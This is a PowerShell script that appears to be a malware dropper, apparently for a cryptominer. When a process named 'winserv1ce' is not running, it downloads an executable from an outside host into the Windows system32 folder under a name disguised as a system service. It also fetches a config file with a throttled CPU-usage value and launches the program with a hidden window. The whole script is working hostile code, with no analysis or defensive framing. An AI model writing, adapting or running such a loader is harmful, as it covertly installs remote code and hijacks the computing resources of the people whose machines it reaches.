function config
{
$counter = New-Object Diagnostics.PerformanceCounter
$counter.CategoryName = "Processor"
$counter.CounterName = "% Processor Time"
$counter.InstanceName = "_Total"
$url = "http://tsetff.hostinger.com/config.php?cpu=800"
$out = "C://windows/system32/asdfsadfsdfsadfsd"
$client = new-object System.Net.WebClient
$client.DownloadFile($url, $out)
$sum = 0
for($i=1;$i -le 0;$i++)
{
    $value = $counter.NextValue()
	$sum += $value
	echo $value
	sleep 10
}
$url = "http://tsetff.hostinger.com/config.php?cpu="+[string][int]((100-$sum/100)*0.8)
$out = "C://windows/system32/config.json"
$client = new-object System.Net.WebClient
$client.DownloadFile($url, $out)
}

function up
{
	if ([IntPtr]::Size -eq 8)
	{
		$url = "http://tsetff.hostinger.com/64"
		$out = "C://windows/system32/winserv1ce.exe"
		$client = new-object System.Net.WebClient
		$client.DownloadFile($url, $out)
		config
		Start-Process winserv1ce.exe -WindowStyle Hidden
	}
	else
	{
		
		$url = "http://tsetff.hostinger.com/32"
		$out = "C://windows/system32/winserv1ce.exe"
		$client = new-object System.Net.WebClient
		$client.DownloadFile($url, $out)
		config
		Start-Process winserv1ce.exe -WindowStyle Hidden
	} 
}

function test-process-func
{
Trap {up; Continue}
&{
Get-Process winserv1ce -ea Stop
}
}
test-process-func
